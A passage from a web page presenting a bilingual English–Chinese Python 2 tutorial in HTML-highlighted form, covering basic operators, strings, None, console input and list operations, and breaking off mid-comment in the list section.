class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Single line comments start with a number symbol.</span></span><br><span class="line"><span class="comment"># 单行注释用井号打头</span></span><br><span class="line"></span><br><span class="line"><span class="string">""" Multiline strings can be written</span></span><br><span class="line"><span class="string">    using three "s, and are often used</span></span><br><span class="line"><span class="string">    as comments</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">""" 多行字符串用</span></span><br><span class="line"><span class="string"> 三个 "打头，</span></span><br><span class="line"><span class="string"> 也可用于注释</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">## 1. Primitive Datatypes and Operators</span></span><br><span class="line"><span class="comment">## 1. 基本数据类型和操作符</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You have numbers</span></span><br><span class="line"><span class="comment"># 数字</span></span><br><span class="line"><span class="number">3</span>  <span class="comment"># =&gt; 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Math is what you would expect</span></span><br><span class="line"><span class="comment"># 基本运算也正常</span></span><br><span class="line"><span class="number">1</span> + <span class="number">1</span>  <span class="comment"># =&gt; 2</span></span><br><span class="line"><span class="number">8</span> - <span class="number">1</span>  <span class="comment"># =&gt; 7</span></span><br><span class="line"><span class="number">10</span> * <span class="number">2</span>  <span class="comment"># =&gt; 20</span></span><br><span class="line"><span class="number">35</span> / <span class="number">5</span>  <span class="comment"># =&gt; 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Division is a bit tricky. It is integer division and floors the results</span></span><br><span class="line"><span class="comment"># automatically.</span></span><br><span class="line"><span class="comment"># 除法稍微复杂点。计算结果自动取整。</span></span><br><span class="line"><span class="number">5</span> / <span class="number">2</span>  <span class="comment"># =&gt; 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To fix division we need to learn about floats.</span></span><br><span class="line"><span class="comment"># 为了修正除法的问题，我们需要先学习浮点数。</span></span><br><span class="line"><span class="number">2.0</span>     <span class="comment"># This is a float这是个浮点数</span></span><br><span class="line"><span class="number">11.0</span> / <span class="number">4.0</span>  <span class="comment"># =&gt; 2.75 ahhh...much better好多了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Result of integer division truncated down both for positive and negative.</span></span><br><span class="line"><span class="comment"># 无论正负，整数除法的结果都会取整。</span></span><br><span class="line"><span class="number">5</span> // <span class="number">3</span>     <span class="comment"># =&gt; 1</span></span><br><span class="line"><span class="number">5.0</span> // <span class="number">3.0</span> <span class="comment"># =&gt; 1.0 # works on floats too浮点数也一样</span></span><br><span class="line"><span class="number">-5</span> // <span class="number">3</span>  <span class="comment"># =&gt; -2</span></span><br><span class="line"><span class="number">-5.0</span> // <span class="number">3.0</span> <span class="comment"># =&gt; -2.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note that we can also import division module(Section 6 Modules)</span></span><br><span class="line"><span class="comment"># to carry out normal division with just one '/'.</span></span><br><span class="line"><span class="comment"># 我们也可以导入division module（第六章的模块），要进行正常的除法，只需要一个 '/'</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="number">11</span>/<span class="number">4</span>    <span class="comment"># =&gt; 2.75  ...normal division</span></span><br><span class="line"><span class="number">11</span>//<span class="number">4</span>   <span class="comment"># =&gt; 2 ...floored division  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modulo operation</span></span><br><span class="line"><span class="comment"># 取余数</span></span><br><span class="line"><span class="number">7</span> % <span class="number">3</span> <span class="comment"># =&gt; 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exponentiation (x to the yth power)</span></span><br><span class="line"><span class="comment"># 幂运算（x 的 y 次幂）</span></span><br><span class="line"><span class="number">2</span>**<span class="number">4</span> <span class="comment"># =&gt; 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enforce precedence with parentheses</span></span><br><span class="line"><span class="comment"># 括号优先</span></span><br><span class="line">(<span class="number">1</span> + <span class="number">3</span>) * <span class="number">2</span>  <span class="comment"># =&gt; 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Boolean Operators</span></span><br><span class="line"><span class="comment"># Note "and" and "or" are case-sensitive</span></span><br><span class="line"><span class="comment"># 布尔运算符 注意 "and" "or"区分大小写</span></span><br><span class="line"><span class="keyword">True</span> <span class="keyword">and</span> <span class="keyword">False</span> <span class="comment">#=&gt; False</span></span><br><span class="line"><span class="keyword">False</span> <span class="keyword">or</span> <span class="keyword">True</span> <span class="comment">#=&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note using Bool operators with ints</span></span><br><span class="line"><span class="comment"># 注意在整数上使用布尔运算符</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">and</span> <span class="number">2</span> <span class="comment">#=&gt; 0</span></span><br><span class="line"><span class="number">-5</span> <span class="keyword">or</span> <span class="number">0</span> <span class="comment">#=&gt; -5</span></span><br><span class="line"><span class="number">0</span> == <span class="keyword">False</span> <span class="comment">#=&gt; True</span></span><br><span class="line"><span class="number">2</span> == <span class="keyword">True</span> <span class="comment">#=&gt; False</span></span><br><span class="line"><span class="number">1</span> == <span class="keyword">True</span> <span class="comment">#=&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># negate with not</span></span><br><span class="line"><span class="comment"># 用"not"取反</span></span><br><span class="line"><span class="keyword">not</span> <span class="keyword">True</span>  <span class="comment"># =&gt; False</span></span><br><span class="line"><span class="keyword">not</span> <span class="keyword">False</span>  <span class="comment"># =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Equality is ==</span></span><br><span class="line"><span class="comment"># ==是等于</span></span><br><span class="line"><span class="number">1</span> == <span class="number">1</span>  <span class="comment"># =&gt; True</span></span><br><span class="line"><span class="number">2</span> == <span class="number">1</span>  <span class="comment"># =&gt; False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inequality is !=</span></span><br><span class="line"><span class="comment"># != 是不等于</span></span><br><span class="line"><span class="number">1</span> != <span class="number">1</span>  <span class="comment"># =&gt; False</span></span><br><span class="line"><span class="number">2</span> != <span class="number">1</span>  <span class="comment"># =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># More comparisons</span></span><br><span class="line"><span class="comment"># 更多的比较符</span></span><br><span class="line"><span class="number">1</span> &lt; <span class="number">10</span>  <span class="comment"># =&gt; True</span></span><br><span class="line"><span class="number">1</span> &gt; <span class="number">10</span>  <span class="comment"># =&gt; False</span></span><br><span class="line"><span class="number">2</span> &lt;= <span class="number">2</span>  <span class="comment"># =&gt; True</span></span><br><span class="line"><span class="number">2</span> &gt;= <span class="number">2</span>  <span class="comment"># =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Comparisons can be chained!</span></span><br><span class="line"><span class="comment"># 比较符可以连在一起</span></span><br><span class="line"><span class="number">1</span> &lt; <span class="number">2</span> &lt; <span class="number">3</span>  <span class="comment"># =&gt; True</span></span><br><span class="line"><span class="number">2</span> &lt; <span class="number">3</span> &lt; <span class="number">2</span>  <span class="comment"># =&gt; False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Strings are created with " or '</span></span><br><span class="line"><span class="comment"># 用单引号和双引号新建字符串</span></span><br><span class="line"><span class="string">"This is a string."</span></span><br><span class="line"><span class="string">'This is also a string.'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Strings can be added too!</span></span><br><span class="line"><span class="comment"># 字符串可以相加</span></span><br><span class="line"><span class="string">"Hello "</span> + <span class="string">"world!"</span>  <span class="comment"># =&gt; "Hello world!"</span></span><br><span class="line"><span class="comment"># Strings can be added without using '+'</span></span><br><span class="line"><span class="comment"># 字符串不用加号也可以相加</span></span><br><span class="line"><span class="string">"Hello "</span> <span class="string">"world!"</span>  <span class="comment"># =&gt; "Hello world!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ... or multiplied</span></span><br><span class="line"><span class="comment"># 也可以相乘</span></span><br><span class="line"><span class="string">"Hello"</span> * <span class="number">3</span>  <span class="comment"># =&gt; "HelloHelloHello"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A string can be treated like a list of characters</span></span><br><span class="line"><span class="comment"># 字符串可以当做是字符的表</span></span><br><span class="line"><span class="string">"This is a string"</span>[<span class="number">0</span>]  <span class="comment"># =&gt; 'T'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># % can be used to format strings, like this:</span></span><br><span class="line"><span class="comment"># 百分号可以用来格式化字符串</span></span><br><span class="line"><span class="string">"%s can be %s"</span> % (<span class="string">"strings"</span>, <span class="string">"interpolated"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A newer way to format strings is the format method.</span></span><br><span class="line"><span class="comment"># This method is the preferred way</span></span><br><span class="line"><span class="comment"># 用 format 来格式化字符串，这也是首选的方法</span></span><br><span class="line"><span class="string">"&#123;0&#125; can be &#123;1&#125;"</span>.format(<span class="string">"strings"</span>, <span class="string">"formatted"</span>)</span><br><span class="line"><span class="comment"># You can use keywords if you don't want to count.</span></span><br><span class="line"><span class="comment"># 如果你不想数数的话，也可以使用关键字</span></span><br><span class="line"><span class="string">"&#123;name&#125; wants to eat &#123;food&#125;"</span>.format(name=<span class="string">"Bob"</span>, food=<span class="string">"lasagna"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># None is an object</span></span><br><span class="line"><span class="comment"># None 也是一个对象</span></span><br><span class="line"><span class="keyword">None</span>  <span class="comment"># =&gt; None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don't use the equality "==" symbol to compare objects to None</span></span><br><span class="line"><span class="comment"># Use "is" instead</span></span><br><span class="line"><span class="comment"># 别用 "==" 来比较 None，用 "is"</span></span><br><span class="line"><span class="string">"etc"</span> <span class="keyword">is</span> <span class="keyword">None</span>  <span class="comment"># =&gt; False</span></span><br><span class="line"><span class="keyword">None</span> <span class="keyword">is</span> <span class="keyword">None</span>  <span class="comment"># =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The 'is' operator tests for object identity. This isn't</span></span><br><span class="line"><span class="comment"># very useful when dealing with primitive values, but is</span></span><br><span class="line"><span class="comment"># very useful when dealing with objects.</span></span><br><span class="line"><span class="comment"># "is"操作符用于对象。但不怎么适用于基本数据类型，最好还是用于处理对象。</span></span><br><span class="line"><span class="comment"># None, 0, and empty strings/lists all evaluate to False.</span></span><br><span class="line"><span class="comment"># All other values are True</span></span><br><span class="line"><span class="comment"># None，0，和空字符串，空表都被视为 False，其他的都是 True。</span></span><br><span class="line">bool(<span class="number">0</span>)  <span class="comment"># =&gt; False</span></span><br><span class="line">bool(<span class="string">""</span>)  <span class="comment"># =&gt; False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">## 2. Variables and Collections</span></span><br><span class="line"><span class="comment">## 2. 变量与集合</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python has a print statement</span></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"I'm Python. Nice to meet you!"</span> <span class="comment"># =&gt; I'm Python. Nice to meet you!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple way to get input data from console</span></span><br><span class="line"><span class="comment"># 从控制台获得输入</span></span><br><span class="line">input_string_var = raw_input(<span class="string">"Enter some data: "</span>) <span class="comment"># Returns the data as a string</span></span><br><span class="line">input_var = input(<span class="string">"Enter some data: "</span>) <span class="comment"># Evaluates the data as python code</span></span><br><span class="line"><span class="comment"># Warning: Caution is recommended for input() method usage</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> In python 3, input() is deprecated and raw_input() is renamed to input()</span></span><br><span class="line"><span class="comment"># 使用 input() 的时候最好有警告</span></span><br><span class="line"><span class="comment"># 在 Python 3中，input() 已经不使用了，raw_input()也重命名为input()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to declare variables before assigning to them.</span></span><br><span class="line"><span class="comment"># 在变量赋值之前不用声明</span></span><br><span class="line">some_var = <span class="number">5</span>    <span class="comment"># Convention is to use lower_case_with_underscores</span></span><br><span class="line">some_var  <span class="comment"># =&gt; 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accessing a previously unassigned variable is an exception.</span></span><br><span class="line"><span class="comment"># See Control Flow to learn more about exception handling.</span></span><br><span class="line"><span class="comment"># 访问一个未赋值的变量会产生一个异常。</span></span><br><span class="line"><span class="comment"># 进一步了解异常处理，可参见下一节《控制流》。</span></span><br><span class="line">some_other_var  <span class="comment"># Raises a name error 抛出一个名称错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if can be used as an expression</span></span><br><span class="line"><span class="comment"># if 可以作为表达式来使用</span></span><br><span class="line"><span class="comment"># Equivalent of C's '?:' ternary operator</span></span><br><span class="line"><span class="comment"># 和 C 的 "?:" 三元等号一样</span></span><br><span class="line"><span class="string">"yahoo!"</span> <span class="keyword">if</span> <span class="number">3</span> &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">2</span>  <span class="comment"># =&gt; "yahoo!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lists store sequences</span></span><br><span class="line"><span class="comment"># 列表储存了顺序</span></span><br><span class="line">li = []</span><br><span class="line"><span class="comment"># You can start with a prefilled list</span></span><br><span class="line"><span class="comment"># 预先填充好的列表</span></span><br><span class="line">other_li = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add stuff to the end of a list with append</span></span><br><span class="line"><span class="comment"># 使用 append 方法把元素添加到列表的尾部</span></span><br><span class="line">li.append(<span class="number">1</span>)    <span class="comment"># li is now [1]</span></span><br><span class="line">li.append(<span class="number">2</span>)    <span class="comment"># li is now [1, 2]</span></span><br><span class="line">li.append(<span class="number">4</span>)    <span class="comment"># li is now [1, 2, 4]</span></span><br><span class="line">li.append(<span class="number">3</span>)    <span class="comment"># li is now [1, 2, 4, 3]</span></span><br><span class="line"><span class="comment"># Remove from the end with pop</span></span><br><span class="line"><span class="comment"># 使用 pop 来移除最后一个元素</span></span><br><span class="line">li.pop()        <span class="comment"># =&gt; 3 and li is now [1, 2, 4]</span></span><br><span class="line"><span class="comment"># Let's put it back</span></span><br><span class="line"><span class="comment"># 使用 append 来添加</span></span><br><span class="line">li.append(<span class="number">3</span>)    <span class="comment"># li is now [1, 2, 4, 3] again.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Access a list like you would any array</span></span><br><span class="line"><span class="comment"># 像访问数组一样访问列表</span></span><br><span class="line">li[<span class="number">0</span>]  <span class="comment"># =&gt; 1</span></span><br><span class="line"><span class="comment"># Assign new values to indexes that have already been initialized with =</span></span><br><span class="line"><span class="comment"># 使用 = 来分配新的值</span></span><br><span class="line">li[<span class="number">0</span>] = <span class="number">42</span></span><br><span class="line">li[<span class="number">0</span>]  <span class="comment"># =&gt; 42</span></span><br><span class="line">li[<span class="number">0</span>] = <span class="number">1</span>  <span class="comment"># <span class="doctag">Note:</span> setting it back to the original value</span></span><br><span class="line"><span class="comment"># Look at the last element</span></span><br><span class="line"><span class="comment"># 访问最后一个值</span></span><br><span class="line">li[<span class="number">-1</span>]  <span class="comment"># =&gt; 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Looking out of bounds is an IndexError</span></span><br><span class="line"><span class="comment"># 超出边界会报错</span></span><br><span class="line">li[<span class="number">4</span>]  <span class="comment"># Raises an IndexError</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can look at ranges with slice syntax.</span></span><br><span class="line"><span class="comment"># (It's a closed/open range for you mathy types.)</span></span><br><span class="line"><span class="comment"># 你可以使用切片语法来查询列表的一个范围。</span></span><br><span class="line"><span class="comment"># （这个范围相当于数学中的左闭右开区间。）</span></span><br><span class="line">li[<span class="number">1</span>:<span class="number">3</span>]  <span class="comment"># =&gt; [2, 4]</span></span><br><span class="line"><span class="comment"># Omit the beginning</span></span><br><span class="line"><span class="comment"># 从某值开始</span></span><br><span class="line">li[<span class="number">2</span>:]  <span class="comment"># =&gt; [4, 3]</span></span><br><span class="line"><span class="comment"># Omit the end</span></span><br><span class="line"><span class="comment"># 到某值结束</span></span><br><span class="line">li[:<span class="number">3</span>]  <span class="comment"># =&gt; [1, 2, 4]</span></span><br><span class="line"><span class="comment"># Select every second entry</span></span><br><span class="line"><span class="comment"># 每两个遍历</span></span><br><span class="line">li[::<span class="number">2</span>]   <span class="comment"># =&gt;[1, 4]</span></span><br><span class="line"><span class="comment"># Reverse a copy of the list</span></span><br><span class="line"><span class="comment"># 倒序遍历</span></span><br><span class="line">li[::<span class="number">-1</span>]   <span class="comment"># =&gt; [3, 4, 2, 1]</span></span><br><span class="line"><span class="comment"># Use any combination of these to make advanced slices</span></span><br><span class="line"><span class="comment"># 使用以下方法高级遍历</span></span><br><span class="line"><span class="comment"># li[start:end:step]</span></span><br><span class="line"><span class="comment"># 列表名[开始:结束:步]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove arbitrary elements from a list with "del"</span></span><br><span class="line"><span class="comment"># 使用 del 来删除列表中的值</span></span><br><span class="line"><span class="keyword">del</span> li[<span class="number">2</span>]   <span class="comment"># li is now [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can add lists</span></span><br><span class="line"><span class="comment"># 列表也可以相加</span></span><br><span class="line">li + other_li   <span class="comment"># =&gt; [1, 2, 3, 4, 5, 6]</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> values for li and for other_li are not modified.</span></span><br><span class="line"><span class="comment"># 注意： 上述两个列表中的值都没有改变</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Concatenate lists with "extend()"</span></span><br><span class="line"><span class="comment"># 使用 extend() 来合并列表</span></span><br><span class="line">li.extend(other_li)   <span class="comment"># Now li is [1, 2, 3, 4, 5, 6]现在 li 长这样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove first occurrence of a value</span></span><br><span class="line"><span class="comment"># 删除第一个出现的值</span></span><br><span class="line">li.remove(<span class="number">2</span>)  <span class="comment"># li is now [1, 3, 4, 5, 6]第一个 2 被删除了</span></span><br><span class="line">li.remove(<span class="number">2</span>)  <span class="comment"># Raises a ValueError as 2 is not in the list报错了，没有 2 了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Insert an element at a specific index</span></span><br><span class="line"><span class="comment"># 把值插入准确位置</span></span><br><span class="line">li.insert(<span class="number">1</span>, <span class="number">2</span>)  <span class="comment"># li is now [1, 2, 3, 4, 5, 6] again</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the index of the first item found</span></span><br><span class="line"><span class="comment"># 